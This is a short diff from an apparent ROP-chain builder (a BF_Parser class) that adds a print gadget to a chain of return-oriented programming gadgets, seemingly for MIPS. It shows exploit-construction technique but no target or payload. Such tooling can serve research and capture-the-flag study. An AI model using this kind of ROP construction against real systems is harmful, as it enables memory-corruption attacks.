@@ -131,6 +131,7 @@ class BF_Parser():
                                          s3=1, \
                                          s7=self.__charger.get_vaddr(), \
                                         )
+                rop_chain += self.__charger.print_gadget()
 
                 self.__construct_restore_a3(ra=self.__mov_s0_a0.get_vaddr(), \
                                             s2=1 \
